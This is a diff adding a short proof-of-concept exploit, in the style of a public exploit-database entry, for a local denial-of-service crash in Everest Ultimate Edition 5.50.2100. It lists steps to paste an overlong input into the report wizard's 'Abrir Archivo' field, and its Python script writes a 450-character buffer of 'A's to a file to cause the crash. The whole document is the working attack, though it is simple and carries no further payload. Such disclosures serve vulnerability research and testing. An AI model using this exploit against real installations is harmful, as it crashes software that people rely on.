@@ -1,0 +1,21 @@
+# Exploit Title: Everest 5.50.2100 - 'Open File' Denial of Service (PoC)
+# Discovery by: Ivan Marmolejo
+# Discovery Date: 2020-03-24
+# Software Link : http://www.lavalys.com/
+# Tested Version: 5.50.2100
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 10 Home Single Language
+
+# Steps to produce the crash:
+#1.- Run python code: Everest.py
+#2.- Open Everest.txt and copy content to clipboard
+#3.- Open "Everest Ultimate Edition"
+#4.- Select "Informe" > "Asistente de Informes" > "Next" > Select "Abrir Archivo"
+#5.- In "Abrir Archivo" field paste Clipboard
+#6.- Select "Next"
+#7.- Crashed
+
+buffer = "\x41" * 450
+f = open ("Everest.txt", "w")
+f.write(buffer)
+f.close()
